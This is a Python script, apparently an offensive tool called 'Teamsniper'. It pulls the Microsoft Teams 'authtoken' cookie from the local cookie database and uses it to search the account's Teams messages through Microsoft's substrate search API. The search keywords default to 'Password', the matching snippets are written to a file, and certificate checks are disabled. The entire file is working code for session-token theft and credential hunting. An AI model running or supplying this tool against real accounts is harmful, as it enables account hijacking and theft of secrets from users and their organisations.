import sqlite3, os, json, argparse, requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning

DBPath = ['%AppData%\Microsoft\Teams\Cookies','%AppData%\Microsoft\Teams\Local Storage\leveldb']
Keywords = []

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def CheckPath(DBPath):

    for i in range(0,len(DBPath)):
        tmp = os.path.expandvars(DBPath[i])
        if os.path.isfile(tmp) and os.access(tmp, os.R_OK):

            return tmp
    print("[!] Couldn't fetch the database!!");exit(0)


def DBParser(DBPath):

    try:
        conn = sqlite3.connect(DBPath)
    except Exception as e:
        print("Error: %s" % e);exit(0)

    Cookies = {}

    cur = conn.cursor()
    cur.execute("SELECT name,value FROM cookies")

    rows = cur.fetchall()

    for row in rows:
        if row[0] == "authtoken":
            Cookies[row[0]] = "%s" % row[1]
            return Cookies
            
    print ( "\n[!] Couldn't fetch the AuthToken Header! This teams account may be personal!" ); exit(0)

def RequestParser(unparsed):

    unparsed = json.loads(unparsed)
    unparsed = unparsed["EntitySets"][0]["ResultSets"][0]["Results"]
    print("[+] Results found: %i" % len(unparsed))
    SaveOutput = open("output.txt","a")
    
    try:
        for i in range (0,len(unparsed)):
            SaveOutput.write("%s\n" % unparsed[i]["HitHighlightedSummary"].encode())
            
    except Exception as e:
        print("[!] Error in parsing the response. ERROR: ", e);exit(0)
    
    print("[+] saved output.")
    SaveOutput.close()

def SendReq(JsonHeaders, JsonData):
    req = requests.post("https://substrate.office.com/search/api/v2/query", json= JsonData, headers= JsonHeaders,verify = False)
    if req.status_code == 200:
        RequestParser(req.text)

    else:
        print("[!] Response code: %i" % req.status_code);exit(0)

def PrepareRequest(searchwords, AuthHeader):

    DataFile = open("PostData.conf","r").read()
    
    for i in range(0,len(searchwords)):
        print("[+] Keyword: %s" % searchwords[i])

        PostData = json.loads(DataFile.replace("CHANGEKEYWORDS",searchwords[i]))
        SendReq(AuthHeader,PostData)



if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Teamsniper is a tool for fetching the given keywords in Microsoft Teams.')
    parser.add_argument("-d", "--database", help="Sqlite Database for the Cookies, default: AppData\Microsoft\Teams\Cookies, AppData\Microsoft\Teams\Local Storage\leveldb",required=False)
    parser.add_argument("-a", "--Authtoken", help="Auth-Token File Location, by default the auth token key will be extracted from the Sqlite Database.",required=False)
    parser.add_argument("-s", "--search", help="Keywords, by default: Password. You can add multiple keywords ex: Passwords,Admin,Database",required=False)
    args = parser.parse_args()


    if (args.search):
        WordsList = args.search.split(",")
        for i in range(0,len(WordsList)):
            Keywords.append(WordsList[i])
        
    else:
        Keywords.append("Password")

    if (args.database):
        
        DBPath.insert(0,args.database)
        DBLocation = CheckPath(DBPath)
        AuthToken = DBParser(DBLocation)

    if (args.Authtoken):
        AuthToken = open(args.Authtoken,"r").read()

    else:

        DBLocation = CheckPath(DBPath)
        AuthToken = DBParser(DBLocation)

    HeaderConfg = open("Headers.conf","r").read() % AuthToken
    print("[+] Auth-key added to headers")
    PrepareRequest(Keywords, json.loads(HeaderConfg))
